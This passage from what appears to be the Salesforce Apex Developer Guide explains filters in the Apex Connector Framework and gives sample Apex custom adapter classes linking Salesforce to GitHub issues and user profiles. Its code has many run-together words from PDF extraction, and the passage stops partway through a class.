DataSource.QueryAggregation.COUNT){
List<Map<String, Object>> countResponse= new List<Map<String,
Object>>();
Map<String, Object> countRow= new Map<String, Object>();
countRow.put(context.tableSelection.columnsSelected.get(0).columnName,
response.size());
countResponse.add(countRow);
returnDataSource.TableResult.get(context,countResponse);
}
returnDataSource.TableResult.get(context,response);
}
SEE ALSO:
Apex Reference Guide: QueryContext Class
Create a Sample DataSource.Connection Class
535
Using Salesforce Features with ApexApex Developer Guide

Filters in the Apex Connector Framework
The DataSource.QueryContext contains one DataSource.TableSelection. The DataSource.SearchContext
can have more than one TableSelection. Each TableSelection has a filter property that represents the WHERE
clause in a SOQL or SOSL query.
For example, when a user goes to an external object’s record detail page, your DataSource.Connection is executed. Behind
the scenes, we generate a SOQL query similar to the following.
SELECTcolumnNames
FROMexternalObjectApiName
WHEREExternalId= 'selectedExternalObjectExternalId'
This SOQL query causes the query method on your DataSource.Connection class to be invoked. The following code can
detect this condition.
if (context.tableSelection.filter!= null) {
if (context.tableSelection.filter.type== DataSource.FilterType.EQUALS
&& 'ExternalId'==  context.tableSelection.filter.columnName
&& context.tableSelection.filter.columnValueinstanceOfString) {
Stringselection= (String)context.tableSelection.filter.columnValue;
returnDataSource.TableResult.get(true, null,
tableSelection.tableSelected,findSingleResult(selection));
}
}
This code example assumes that you implemented a findSingleResult method that returns a single record, given the selected
ExternalId. Make sure that your code obtains the record that matches the requested ExternalId.
Evaluating Filters in the Apex Connector Framework
A filter evaluates to true for a row if that row matches the conditions that the filter describes.
Compound Filters in the Apex Connector Framework
Filters can have child filters, which are stored in the subfilters property.
Evaluating Filters in the Apex Connector Framework
A filter evaluates to true for a row if that row matches the conditions that the filter describes.
For example, suppose that a DataSource.Filter has columnName set to meaningOfLife, columnValue set to 42,
and type set to EQUALS. Any row in the remote table whose meaningOfLife column entry equals 42 is returned.
Suppose, instead, that the filter has type set to LESS_THAN, columnValue set to 3, and columnName set to numericCol.
We’d construct a DataSource.TableResult object that contains all the rows that have a numericCol value less than 3.
To improve performance, do all the filtering in the external system. You can, for example, translate the Filter object into a SQL or
OData query, or map it to parameters on a SOAP query. If the external system returns a large set of data, and you do the filtering in your
Apex code, you quickly exceed your governor limits.
If you can’t do all the filtering in the external system, do as much as possible there and return as little data as possible. Then filter the
smaller collection of data in your Apex code.
SEE ALSO:
Apex Reference Guide: Filter Class
536
Using Salesforce Features with ApexApex Developer Guide

Compound Filters in the Apex Connector Framework
Filters can have child filters, which are stored in the subfilters property.
If a filter has children, the filter type must be one of the following.
DescriptionFilter Type
We return all rows that match all of the subfilters.AND_
We return all rows that match any of the subfilters.OR_
The filter reverses how its child filter evaluates rows. Filters of this type can have only one subfilter.NOT_
This code example illustrates how to deal with compound filters.
overrideglobalDataSource.TableResultquery(DataSource.QueryContextcontext){
// Callout to an externaldatasourceand retrievea set of records.
// We shouldattemptto get as muchinformationas possibleaboutthe
// queryfromthe QueryContext,to minimizethe numberof records
// thatwe return.
List<Map<String,Object>> rows= retrieveData(context);
// Thisonlyfiltersthe results.Anythingin the querythatwe don’t
// currentlysupport,suchas aggregationor sorting,is ignored.
returnDataSource.TableResult.get(context,postFilterRecords(
context.tableSelection.filter,rows));
}
privateList<Map<String,Object>> retrieveData(DataSource.QueryContextcontext){
// Callout to an externaldatasource.Formthe calloutso that
// it filtersas muchas possibleon the remotesite,
// basedon the parametersin the QueryContext.
return...;
}
privateList<Map<String,Object>> postFilterRecords(
DataSource.Filterfilter,List<Map<String,Object>> rows){
if (filter== null) {
returnrows;
}
DataSource.FilterTypetype= filter.type;
List<Map<String,Object>> retainedRows= new List<Map<String,Object>>();
if (type== DataSource.FilterType.NOT_){
// We expectone Filterin the subfilters.
DataSource.Filtersubfilter= filter.subfilters.get(0);
for (Map<String,Object> row : rows){
if (!evaluate(filter,row)){
retainedRows.add(row);
}
}
returnretainedRows;
} elseif (type== DataSource.FilterType.AND_){
// For eachfilter,findall matches;anythingthatmatchesALL filters
// is returned.
537
Using Salesforce Features with ApexApex Developer Guide

retainedRows= rows;
for (DataSource.Filtersubfilter: filter.subfilters){
retainedRows= postFilterRecords(subfilter,retainedRows);
}
returnretainedRows;
} elseif (type== DataSource.FilterType.OR_){
// For eachfilter,findall matches.Anythingthatmatches
// at leastone filteris returned.
for (DataSource.Filtersubfilter: filter.subfilters){
List<Map<String,Object>> matchedRows= postFilterRecords(
subfilter,rows);
retainedRows.addAll(matchedRows);
}
returnretainedRows;
} else{
// Findall matchesfor thisfilterin our collectionof records.
for (Map<String,Object> row : rows){
if (evaluate(filter,row)){
retainedRows.add(row);
}
}
returnretainedRows;
}
}
privateBooleanevaluate(DataSource.Filterfilter,Map<String,Object> row){
if (filter.type== DataSource.FilterType.EQUALS){
StringcolumnName= filter.columnName;
ObjectexpectedValue= filter.columnValue;
ObjectfoundValue= row.get(columnName);
returnexpectedValue.equals(foundValue);
} else{
// Throwan exception;implementingotherfiltertypesis left
// as an exercisefor the reader.
throwException('Unexpectedfiltertype:' + filter.type);
}
returnfalse;
}
SEE ALSO:
Apex Reference Guide: Filter Class
Considerations for the Apex Connector Framework
Understand the limits and considerations for creating Salesforce Connect custom adapters with the Apex Connector Framework.
•
If you change and save a DataSource.Connection class, resave the corresponding DataSource.Provider class.
Otherwise, when you define the external data source, the custom adapter doesn’t appear as an option for the Type field. Also, the
associated external objects’ custom tabs no longer appear in the Salesforce UI.
•
DML operations aren’t allowed in the Apex code that comprises the custom adapter.
•
Make sure that you understand the limits of the external system’s APIs. For example, some external systems accept only requests
for up to 40 rows.
538
Using Salesforce Features with ApexApex Developer Guide

•
Apex data type limitations:
–
Double—The value loses precision beyond 18 significant digits. For higher precision, use decimals instead of doubles.
–
String—If the length is greater than 255 characters, the string is mapped to a long text area field in Salesforce.
•
Custom adapters for Salesforce Connect are subject to the same limitations as any other Apex code. For example:
–
All Apex governor limits apply.
–
Test methods don’t support web service callouts. Tests that perform web service callouts fail. For an example that shows how
to avoid these failing tests by returning mock responses, see Google Drive
™
 Custom Adapter for Salesforce Connect on page
554.
•
In Apex tests, use dynamic SOQL to query external objects. Tests that perform static SOQL queries of external objects fail.
SEE ALSO:
Dynamic SOQL
Apex Connector Framework Examples
These examples illustrate how to use the Apex Connector Framework to create custom adapters for Salesforce Connect.
GitHub Issues Custom Adapter for Salesforce Connect
This example creates a custom adapter that links GitHub Issues to products in Salesforce using an indirect lookup relationship. An
external lookup relationship also links GitHub Issues to the comments on each issue.
GitHub Custom Adapter for Salesforce Connect
This example illustrates how to support indirect lookup relationships. An indirect lookup relationship links a child external object to
a parent standard or custom object.
Google Drive
™
 Custom Adapter for Salesforce Connect
This example illustrates how to use callouts and OAuth to connect to an external system, which in this case is the Google Drive
™
online storage service. The example also shows how to avoid failing tests from web service callouts by returning mock responses
for test methods.
Google Books
™
 Custom Adapter for Salesforce Connect
This example illustrates how to work around the requirements and limits of an external system’s APIs: in this case, the Google Books
API Family.
Loopback Custom Adapter for Salesforce Connect
This example illustrates how to handle filtering in queries. For simplicity, this example connects the Salesforce org to itself as the
external system.
Stack Overflow Custom Adapter for Salesforce Connect
This example illustrates how to support external lookup relationships and multiple tables. An external lookup relationship links a
child standard, custom, or external object to a parent external object. Each table can become an external object in the Salesforce
org.
GitHub Issues Custom Adapter for Salesforce Connect
This example creates a custom adapter that links GitHub Issues to products in Salesforce using an indirect lookup relationship. An external
lookup relationship also links GitHub Issues to the comments on each issue.
This example illustrates a range of common use cases for custom adapters, including how to:
539
Using Salesforce Features with ApexApex Developer Guide

•
Query external data.
•
Work with a range of external object field types, such as Date and Picklist fields.
•
Use indirect lookup relationships, which link a child external object to a parent standard or custom object.
•
Use external lookup relationships, which link a child standard, custom, or external object to a parent external object.
•
Use Data Manipulation Language (DML) operations to insert, update, and delete external data.
To improve unit tests for the Apex code in this example, you can also return mock records in a testing context. See Mock SOQL Tests for
External Objects on page 518.
DataSource.Connection Class
This example creates a class named GitHubDataSourceConnection. For this example to work, create a custom field on the
Product2 standard object. Specify the name of the custom text field as Repository, and select the External ID and Unique attributes.
/**
*   Definesthe connectionto GitHubRESTAPI v3 to support
*   queryingof GitHubprofiles.
*   Extendsthe DataSource.Connectionclassto enable
*   Salesforceto syncthe externalsystem’sschema
*   and to handlequeriesand searchesof the externaldata.
**/
globalclassGitHubDataSourceConnectionextendsDataSource.Connection{
privateDataSource.ConnectionParamsconnectionInfo;
/**
*   Constructorfor GitHubDataSourceConnection
**/
globalGitHubDataSourceConnection(DataSource.ConnectionParamsconnectionInfo){
this.connectionInfo= connectionInfo;
}
/**
*   Calledto queryand get resultsfromthe external
*   systemfor SOQLqueries,listviews,and detailpages
*   for an externalobjectthat’sassociatedwiththe
*   externaldatasource.
*
*   The queryContextargumentrepresentsthe queryto run
*   againsta tablein the externalsystem.
*
*   Returnsa listof rowsas the queryresults.
**/
overrideglobalDataSource.TableResultquery(DataSource.QueryContextcontext){
DataSource.Filterfilter= context.tableSelection.filter;
Stringurl,tableName;
if(context.tableSelection.tableSelected.equals('GithubIssues')) {
tableName= 'GithubIssues';
if (filter!= null) {
StringthisColumnName= filter.columnName;
if (thisColumnName!= null&&
(thisColumnName.equals('ExternalId') ||
thisColumnName.equals('number')))
540
Using Salesforce Features with ApexApex Developer Guide

url = 'callout:GithubNC/issues/'+ filter.columnValue;
else
url = 'callout:GithubNC/issues';
} else{
url = 'callout:GithubNC/issues';
}
} elseif(context.tableSelection.tableSelected.equals('IssueComments')) {
tableName= 'IssueComments';
if (filter!= null) {
StringthisColumnName= filter.columnName;
if (thisColumnName!= null&&
(thisColumnName.equals('ExternalId') ||
thisColumnName.equals('id')))
url = 'callout:GithubNC/issues/comments/'+ filter.columnValue;
else
url = 'callout:GithubNC/issues/comments';
} else{
url = 'callout:GithubNC/issues/comments';
}
}
/**
* Filters,sorts,and applieslimitand offsetclauses.
**/
List<Map<String, Object>> rows= DataSource.QueryUtils.process(context,getData(url,
tableName));
returnDataSource.TableResult.get(true, null, context.tableSelection.tableSelected,
rows);
}
/**
*   Definesthe schemafor the externalsystem.
*   Calledwhenthe Salesforceadminclicks“Validateand Sync”
*   in the userinterfacefor the externaldatasource.
**/
overrideglobalList<DataSource.Table>sync(){
List<DataSource.Table>tables=new List<DataSource.Table>();
List<DataSource.Column>columns,commentsColumns;
columns= new List<DataSource.Column>();
commentsColumns= new List<DataSource.Column>();
// Definesthe externallookupfield.
commentsColumns.add(DataSource.Column.externalLookup('issue_number',
'GithubIssues__x'));
commentsColumns.add(DataSource.Column.text('ExternalId', 255));
commentsColumns.add(DataSource.Column.url('DisplayUrl'));
commentsColumns.add(DataSource.Column.text('Body'));
commentsColumns.add(DataSource.Column.text('Created_By'));
commentsColumns.add(DataSource.Column.datetime('Created'));
commentsColumns.add(DataSource.Column.datetime('Updated'));
tables.add(DataSource.Table.get('IssueComments','id', commentsColumns));
//================================================================================
541
Using Salesforce Features with ApexApex Developer Guide

// Definesthe indirectlookupfield.(Forthisto work,
// makesureyourProduct2standardobjecthas a
// customunique,externalID fieldcalledRepository.)
columns.add(DataSource.Column.indirectLookup('repository_url', 'Product2',
'Repository__c'));
columns.add(DataSource.Column.text('ExternalId',255));
columns.add(DataSource.Column.url('DisplayUrl'));
columns.add(DataSource.Column.text('Title',255));
columns.add(DataSource.Column.text('Description'));
columns.add(DataSource.Column.text('Repo_Name'));
columns.add(DataSource.Column.url('Repo_URL'));
List<Map<String,String>> stateList= new List<Map<String, String>>();
Map<String, String> open= new Map<String,String>();
open.put('Open', 'Open');
stateList.add(open);
Map<String, String> closed= new Map<String,String>();
closed.put('Closed', 'Closed');
stateList.add(closed);
columns.add(DataSource.Column.picklist('State',stateList));
List<Map<String,String>> stateReasonList= new List<Map<String, String>>();
Map<String, String> completed= new Map<String,String>();
completed.put('Completed', 'completed');
stateReasonList.add(completed);
Map<String, String> reopened= new Map<String,String>();
reopened.put('Reopened', 'reopened');
stateReasonList.add(reopened);
Map<String, String> notPlanned= new Map<String,String>();
notPlanned.put('NotPlanned', 'not_planned');
stateReasonList.add(notPlanned);
columns.add(DataSource.Column.picklist('State_Reason',stateReasonList));
columns.add(DataSource.Column.boolean('Locked'));
columns.add(DataSource.Column.text('Lock_Reason', 255));
columns.add(DataSource.Column.datetime('Created'));
columns.add(DataSource.Column.datetime('Updated'));
columns.add(DataSource.Column.datetime('Closed_At'));
tables.add(DataSource.Table.get('GithubIssues','repository_url', columns));
returntables;
}
/**
*   Calledto do a fulltextsearchand get resultsfrom
*   the externalsystemfor SOSLqueriesand Salesforce
*   globalsearches.
*
*   The SearchContextargumentrepresentsthe queryto run
*   againsta tablein the externalsystem.
*
*   Returnsresultsfor eachtablethatthe SearchContext
*   requestedto be searched.
**/
542
Using Salesforce Features with ApexApex Developer Guide

overrideglobalList<DataSource.TableResult>search(
DataSource.SearchContextcontext){
List<DataSource.TableResult>results=
new List<DataSource.TableResult>();
for (Integeri =0;i<context.tableSelections.size();i++){
Stringentity= context.tableSelections[i].tableSelected;
Stringurl = 'callout:GithubNC/issues/'+ context.searchPhrase;
results.add(DataSource.TableResult.get(true, null, entity,getData(url,
entity)));
}
returnresults;
}
globaloverrideList<DataSource.UpsertResult>upsertRows(DataSource.UpsertContext
context){
List<DataSource.UpsertResult>results= new List<DataSource.UpsertResult>();
StringtableName= context.tableSelected;
// Callsthe GitHubAPI to createand updateissues.
List<Map<String, Object>> rows= context.rows;
for(Integeri = 0; i < rows.size();i++){
Map<String,Object> row = rows[i];
Map<String,Object> obj = new Map<String,Object>();
StringexternalId= (String) row.get('ExternalId');
Stringurl,httpMethod;
if(tableName.equals('GithubIssues')) {
url = 'callout:GithubNC/issues';
httpMethod= 'POST';
if(!String.isBlank(externalId)){
httpMethod= 'PATCH';
url = url+'/'+externalId;
}
obj.put('title', row.get('Title'));
obj.put('body', row.get('Description'));
obj.put('state', row.get('State'));
obj.put('state_reason', String.isBlank((String) row.get('State_Reason'))?
null: row.get('State_Reason'));
obj.put('closed_at', row.get('Closed_At'));
}
elseif(tableName.equals('IssueComments')) {
url = 'callout:GithubNC/issues';
if(!String.isBlank(externalId)){
httpMethod= 'PATCH';
url = url+'/comments/'+externalId;
} else{
httpMethod= 'POST';
url = url+'/' + row.get('issue_number') + '/comments';
}
obj.put('body', row.get('Body'));
543
Using Salesforce Features with ApexApex Developer Guide

}
HttpResponseresponse= getResponse(url,httpMethod,obj);
if (response.getStatusCode()!= 200){
results.add(DataSource.UpsertResult.failure(
String.valueOf(row.get('ExternalId')), 'Thecalloutresultedin an
error:' + response.getStatusCode()+' - '+response.getBody()));
}
System.debug(response.getBody());
if(tableName.equals('GithubIssues')) {
HttpResponseresponseForLock= null;
if(!String.isBlank(externalId)){
BooleancurrentlyLocked= isIssueLockedCurrently(url);
BooleanisLocked= (Boolean) row.get('Locked');
BooleanlockStatusChanged= currentlyLocked!= isLocked;
if(lockStatusChanged){
url = url + '/lock';
if(isLocked){
Map<String, Object> lockReasonObj= new Map<String, Object>();
lockReasonObj.put('lock_reason', row.get('Lock_Reason'));
responseForLock= getResponse(url,'PUT', lockReasonObj);
}
else{
responseForLock= getResponse(url,'DELETE', null);
}
if (responseForLock.getStatusCode()!= 200){
results.add(DataSource.UpsertResult.failure(
String.valueOf(row.get('ExternalId')), 'Thecalloutresulted
in an error:' + responseForLock.getStatusCode()+' - '+responseForLock.getBody()));
}
System.debug(responseForLock.getBody());
}
}
}
results.add(DataSource.UpsertResult.success(String.valueOf(externalId)));
}
returnresults;
}
globaloverrideList<DataSource.DeleteResult>deleteRows(DataSource.DeleteContext
context){
List<DataSource.DeleteResult>results= new List<DataSource.DeleteResult>();
StringtableName= context.tableSelected;
// Callsthe GitHubAPI to deleteissues.
if(tableName.equals('IssueComments')) {
for(StringexternalId:context.externalIds){
StringhttpMethod= 'DELETE';
Stringurl = 'callout:GithubNC/issues/comments/'+externalId;
544
Using Salesforce Features with ApexApex Developer Guide

HttpResponseresponse= getResponse(url,httpMethod,null);
if (response.getStatusCode()!= 204){
results.add(DataSource.DeleteResult.failure(
externalId,'Thecalloutresultedin an error:' +
response.getStatusCode()+' - '+response.getBody()));
}
System.debug(response.getBody());
results.add(DataSource.DeleteResult.success(String.valueOf(externalId)));
}
} elseif(tableName.equals('GithubIssues')) {
System.debug('Deletionnot supportedfor GitHubIssues.');
results.add(DataSource.DeleteResult.failure(String.valueOf(context.externalIds),
'Deletionnot supportedfor GitHubIssues.'));
}
returnresults;
}
/**
*   Helpermethodto parsethe data.
*   The url argumentis the URL of the externalsystem.
*   Returnsa listof rowsfromthe externalsystem.
**/
publicList<Map<String, Object>> getData(Stringurl,StringtableName){
Stringresponse= getResponse(url,'GET', null).getBody();
// Standardizeresponsestring
if (!response.contains('"items":')) {
if (response.substring(0,1).equals('{')) {
response= '[' + response+ ']';
}
response= '{"items":' + response+ '}';
}
List<Map<String, Object>> rows= new List<Map<String, Object>>();
Map<String, Object> responseBodyMap= (Map<String, Object>)
JSON.deserializeUntyped(response);
/**
*   Checkserrors.
**/
Map<String, Object> error= (Map<String, Object>)responseBodyMap.get('error');
if (error!=null) {
List<Object> errorsList= (List<Object>)error.get('errors');
Map<String, Object> errors= (Map<String, Object>)errorsList[0];
StringerrorMessage= (String)errors.get('message');
thrownew DataSource.OAuthTokenExpiredException(errorMessage);
}
List<Object> fileItems= (List<Object>)responseBodyMap.get('items');
if (fileItems!= null) {
for (Integeri=0;i < fileItems.size();i++){
Map<String, Object> item= (Map<String, Object>)fileItems[i];
545
Using Salesforce Features with ApexApex Developer Guide

rows.add(createRow(item, tableName));
}
} else{
rows.add(createRow(responseBodyMap,tableName));
}
returnrows;
}
/**
*   Helpermethodto populatethe ExternalID and Display
*   URL fieldson externalobjectrecordsbasedon the 'id'
*   valuethat’ssentby the externalsystem.
*
*   The Map<String,Object>itemparametermapsto the data
*   thatrepresentsa row.
*
*   Returnsan updatedmap withthe ExternalID and
*   DisplayURL values.
**/
publicMap<String, Object> createRow(Map<String, Object> item, StringtableName){
Map<String, Object> row = new Map<String, Object>();
for ( Stringkey : item.keySet()) {
if(tableName.equals('GithubIssues')) {
if (key== 'number') {
row.put('ExternalId', item.get(key));
} elseif (key=='title') {
row.put('Title', item.get(key));
} elseif (key=='body') {
row.put('Description', item.get(key));
} elseif (key=='url') {
row.put('DisplayUrl', item.get(key));
} elseif (key=='repository_url') {
StringrepoUrl= (String) item.get(key);
row.put('Repo_URL', repoUrl);
//extractrepositorynamefromthe URL and add it to the Repo_Name
field
StringrepoName= repoUrl.substring(repoUrl.lastIndexOf('/')+1);
row.put('Repo_Name', repoName);
row.put(key,item.get(key));
}  elseif (key=='state') {
row.put('State', item.get(key));
} elseif (key=='state_reason') {
row.put('State_Reason', item.get(key));
} elseif (key=='locked') {
row.put('Locked', item.get(key));
} elseif (key=='active_lock_reason') {
row.put('Lock_Reason', item.get(key));
} elseif (key=='created_at'&& item.get(key)!= null) {
DateTimecreatedDateTime=
(DateTime)Json.deserialize('"'+item.get(key)+'"', DateTime.class);
row.put('Created', createdDateTime);
} elseif (key=='updated_at'&& item.get(key)!= null) {
DateTimeupdatedDateTime=
546
Using Salesforce Features with ApexApex Developer Guide

(DateTime)Json.deserialize('"'+item.get(key)+'"', DateTime.class);
row.put('Updated', updatedDateTime);
} elseif (key=='closed_at'&& item.get(key)!= null) {
DateTimeclosedDateTime=
(DateTime)Json.deserialize('"'+item.get(key)+'"', DateTime.class);
row.put('Closed_At', closedDateTime);
} else{
row.put(key,item.get(key));
}
}
elseif (tableName.equals('IssueComments')) {
if (key=='id') {
row.put('ExternalId', item.get(key));
} elseif (key=='url') {
row.put('DisplayUrl', item.get(key));
} elseif (key== 'body') {
row.put('Body', item.get(key));
} elseif (key=='user') {
Map<String, Object> ownerMap= (Map<String, Object>)item.get(key);
row.put('Created_By', ownerMap.get('login'));
} elseif (key=='created_at'&& item.get(key)!= null) {
DateTimecreatedDateTime=
(DateTime)Json.deserialize('"'+item.get(key)+'"', DateTime.class);
row.put('Created', createdDateTime);
} elseif (key=='updated_at'&& item.get(key)!= null) {
DateTimeupdatedDateTime=
(DateTime)Json.deserialize('"'+item.get(key)+'"', DateTime.class);
row.put('Updated', updatedDateTime);
} elseif (key=='issue_url') {
StringissueUrl= (String) item.get(key);
row.put('issue_number', issueUrl.substring(issueUrl.lastIndexOf('/')+1));
} else{
row.put(key,item.get(key));
}
}
}
returnrow;
}
publicBooleanisIssueLockedCurrently(Stringurl){
StringexistingIssue= getResponse(url,'GET', null).getBody();
Map<String, Object> existingIssueBodyMap= (Map<String, Object>)
JSON.deserializeUntyped(existingIssue);
/**
*   Checkserrors.
**/
Map<String, Object> error= (Map<String, Object>) existingIssueBodyMap.get('error');
if (error!=null) {
List<Object> errorsList= (List<Object>)error.get('errors');
Map<String, Object> errors= (Map<String, Object>)errorsList[0];
StringerrorMessage= (String)errors.get('message');
547
Using Salesforce Features with ApexApex Developer Guide

thrownew DataSource.OAuthTokenExpiredException(errorMessage);
}
return(Boolean) existingIssueBodyMap.get('locked');
}
/**
*   The url argumentis the URL of the externalsystem.
*   Returnsthe responsefromthe externalsystem.
**/
publicHttpResponsegetResponse(Stringurl,StringhttpMethod,Map<String,Object>
issue){
// Performcalloutsfor production(non-test)results.
HttphttpProtocol= new Http();
HttpRequestrequest= new HttpRequest();
request.setEndpoint(url);
request.setMethod(httpMethod);
if(issue!= null)
request.setBody(JSON.serialize(issue));
returnhttpProtocol.send(request);
}
}
DataSource.Provider Class
This example creates a class named GitHubDataSourceProvider.
/**
*   Extendsthe DataSource.Providerbaseclassto createa
*   customadapterfor SalesforceConnect.The classinforms
*   Salesforceof the functionaland authentication
*   capabilitiesthatare supportedby or requiredto connect
*   to an externalsystem.
**/
globalclassGitHubDataSourceProviderextendsDataSource.Provider{
/**
*   For simplicity,thisexampledeclaresthatthe external
*   systemdoesn’trequireauthenticationby returning
*   AuthenticationCapability.ANONYMOUSas the soleentry
*   in the listof authenticationcapabilities.
**/
overrideglobalList<DataSource.AuthenticationCapability>getAuthenticationCapabilities()
{
List<DataSource.AuthenticationCapability>capabilities= new
List<DataSource.AuthenticationCapability>();
capabilities.add(DataSource.AuthenticationCapability.ANONYMOUS);
returncapabilities;
}
/**
*   Declaresthe functionalcapabilitiesthatthe
*   externalsystemsupports,in thiscase
548
Using Salesforce Features with ApexApex Developer Guide

*   onlySOQLqueries.
**/
overrideglobalList<DataSource.Capability>getCapabilities(){
List<DataSource.Capability>capabilities= new List<DataSource.Capability>();
capabilities.add(DataSource.Capability.ROW_QUERY);
capabilities.add(DataSource.Capability.ROW_CREATE);
capabilities.add(DataSource.Capability.ROW_UPDATE);
capabilities.add(DataSource.Capability.ROW_DELETE);
capabilities.add(DataSource.Capability.PICKLIST);
capabilities.add(DataSource.Capability.MULTI_PICKLIST);
capabilities.add(DataSource.Capability.SEARCH);
returncapabilities;
}
/**
*   Declaresthe associatedDataSource.Connectionclass.
**/
overrideglobalDataSource.ConnectiongetConnection(DataSource.ConnectionParams
connectionParams){
returnnew GitHubDataSourceConnection(connectionParams);
}
}
GitHub Custom Adapter for Salesforce Connect
This example illustrates how to support indirect lookup relationships. An indirect lookup relationship links a child external object to a
parent standard or custom object.
For this example to work, create a custom field on the Contact standard object. Name the custom field github_username, make
it a text field of length 39, and select the ExternalID and Unique attributes. Also, add https://api.github.com to your remote
site settings.
GitHubDataSourceConnection Class
/**
*   Definesthe connectionto GitHubRESTAPI v3 to support
*   queryingof GitHubprofiles.
*   Extendsthe DataSource.Connectionclassto enable
*   Salesforceto syncthe externalsystem’sschema
*   and to handlequeriesand searchesof the externaldata.
**/
globalclassGitHubDataSourceConnectionextends
DataSource.Connection{
privateDataSource.ConnectionParamsconnectionInfo;
/**
*   Constructorfor GitHubDataSourceConnection
**/
globalGitHubDataSourceConnection(
DataSource.ConnectionParamsconnectionInfo){
this.connectionInfo= connectionInfo;
}
549
Using Salesforce Features with ApexApex Developer Guide

/**
*   Calledto queryand get resultsfromthe external
*   systemfor SOQLqueries,listviews,and detailpages
*   for an externalobjectthat’sassociatedwiththe
*   externaldatasource.
*
*   The queryContextargumentrepresentsthe queryto run
*   againsta tablein the externalsystem.
*
*   Returnsa listof rowsas the queryresults.
**/
overrideglobalDataSource.TableResultquery(
DataSource.QueryContextcontext){
DataSource.Filterfilter= context.tableSelection.filter;
Stringurl;
if (filter!= null) {
StringthisColumnName= filter.columnName;
if (thisColumnName!= null&&
(thisColumnName.equals('ExternalId') ||
thisColumnName.equals('login')))
url = 'https://api.github.com/users/'
+ filter.columnValue;
else
url = 'https://api.github.com/users';
} else{
url = 'https://api.github.com/users';
}
/**
* Filters,sorts,and applieslimitand offsetclauses.
**/
List<Map<String, Object>> rows=
DataSource.QueryUtils.process(context,getData(url));
returnDataSource.TableResult.get(true, null,
context.tableSelection.tableSelected,rows);
}
/**
*   Definesthe schemafor the externalsystem.
*   Calledwhenthe administratorclicks“Validateand Sync”
*   in the userinterfacefor the externaldatasource.
**/
overrideglobalList<DataSource.Table>sync(){
List<DataSource.Table>tables=
new List<DataSource.Table>();
List<DataSource.Column>columns;
columns= new List<DataSource.Column>();
// Definesthe indirectlookupfield.(Forthisto work,
// makesureyourContactstandardobjecthas a
// customunique,externalID fieldcalledgithub_username.)
columns.add(DataSource.Column.indirectLookup(
'login', 'Contact', 'github_username__c'));
550
Using Salesforce Features with ApexApex Developer Guide

columns.add(DataSource.Column.text('id', 255));
columns.add(DataSource.Column.text('name',255));
columns.add(DataSource.Column.text('company',255));
columns.add(DataSource.Column.text('bio',255));
columns.add(DataSource.Column.text('followers',255));
columns.add(DataSource.Column.text('following',255));
columns.add(DataSource.Column.url('html_url'));
columns.add(DataSource.Column.url('DisplayUrl'));
columns.add(DataSource.Column.text('ExternalId',255));
tables.add(DataSource.Table.get('githubProfile','login',
columns));
returntables;
}
/**
*   Calledto do a fulltextsearchand get resultsfrom
*   the externalsystemfor SOSLqueriesand Salesforce
*   globalsearches.
*
*   The SearchContextargumentrepresentsthe queryto run
*   againsta tablein the externalsystem.
*
*   Returnsresultsfor eachtablethatthe SearchContext
*   requestedto be searched.
**/
overrideglobalList<DataSource.TableResult>search(
DataSource.SearchContextcontext){
List<DataSource.TableResult>results=
new List<DataSource.TableResult>();
for (Integeri =0;i<context.tableSelections.size();i++){
Stringentity= context.tableSelections[i].tableSelected;
// Searchusernames
Stringurl = 'https://api.github.com/users/'
+ context.searchPhrase;
results.add(DataSource.TableResult.get(
true, null, entity,getData(url)));
}
returnresults;
}
/**
*   Helpermethodto parsethe data.
*   The url argumentis the URL of the externalsystem.
*   Returnsa listof rowsfromthe externalsystem.
**/
publicList<Map<String, Object>> getData(Stringurl){
Stringresponse= getResponse(url);
// Standardizeresponsestring
if (!response.contains('"items":')) {
if (response.substring(0,1).equals('{')) {
551
Using Salesforce Features with ApexApex Developer Guide

response= '[' + response+ ']';
}
response= '{"items":' + response+ '}';
}
List<Map<String, Object>> rows=
new List<Map<String, Object>>();
Map<String, Object> responseBodyMap= (Map<String, Object>)
JSON.deserializeUntyped(response);
/**
*   Checkserrors.
**/
Map<String, Object> error=
(Map<String, Object>)responseBodyMap.get('error');
if (error!=null) {
List<Object> errorsList=
(List<Object>)error.get('errors');
Map<String, Object> errors=
(Map<String, Object>)errorsList[0];
StringerrorMessage= (String)errors.get('message');
thrownew
DataSource.OAuthTokenExpiredException(errorMessage);
}
List<Object> fileItems=
(List<Object>)responseBodyMap.get('items');
if (fileItems!= null) {
for (Integeri=0;i < fileItems.size();i++){
Map<String, Object> item=
(Map<String, Object>)fileItems[i];
rows.add(createRow(item));
}
} else{
rows.add(createRow(responseBodyMap));
}
returnrows;
}
/**
*   Helpermethodto populatethe ExternalID and Display
*   URL fieldson externalobjectrecordsbasedon the 'id'
*   valuethat’ssentby the externalsystem.
*
*   The Map<String,Object>itemparametermapsto the data
*   thatrepresentsa row.
*
*   Returnsan updatedmap withthe ExternalID and
*   DisplayURL values.
**/
publicMap<String, Object> createRow(
Map<String, Object> item){
552
Using Salesforce Features with ApexApex Developer Guide

Map<String, Object> row = new Map<String, Object>();
for ( Stringkey : item.keySet()) {
if (key== 'login') {
row.put('ExternalId', item.get(key));
} elseif (key=='html_url') {
row.put('DisplayUrl', item.get(key));
}
row.put(key,item.get(key));
}
returnrow;
}
/**
*   Helpermethodto makethe HTTPGET call.
*   The url argumentis the URL of the externalsystem.
*   Returnsthe responsefromthe externalsystem.
**/
publicStringgetResponse(Stringurl){
// Performcalloutsfor production(non-test)results.
HttphttpProtocol= new Http();
HttpRequestrequest= new HttpRequest();
request.setEndPoint(url);
request.setMethod('GET');
HttpResponseresponse= httpProtocol.send(request);
returnresponse.getBody();
}
}
GitHubDataSourceProvider Class
/**
*   Extendsthe DataSource.Providerbaseclassto createa
*   customadapterfor SalesforceConnect.The classinforms
*   Salesforceof the functionaland authentication
*   capabilitiesthatare supportedby or requiredto connect
*   to an externalsystem.
**/
globalclassGitHubDataSourceProvider
extendsDataSource.Provider{
/**
*   For simplicity,thisexampledeclaresthatthe external
*   systemdoesn’trequireauthenticationby returning
*   AuthenticationCapability.ANONYMOUSas the soleentry
*   in the listof authenticationcapabilities.
**/
overrideglobalList<DataSource.AuthenticationCapability>
getAuthenticationCapabilities(){
List<DataSource.AuthenticationCapability>capabilities=
new List<DataSource.AuthenticationCapability>();
capabilities.add(
DataSource.AuthenticationCapability.ANONYMOUS);
returncapabilities;
553
Using Salesforce Features with ApexApex Developer Guide

}
/**
*   Declaresthe functionalcapabilitiesthatthe
*   externalsystemsupports,in thiscase
*   onlySOQLqueries.
**/
overrideglobalList<DataSource.Capability>
getCapabilities(){
List<DataSource.Capability>capabilities=
new List<DataSource.Capability>();
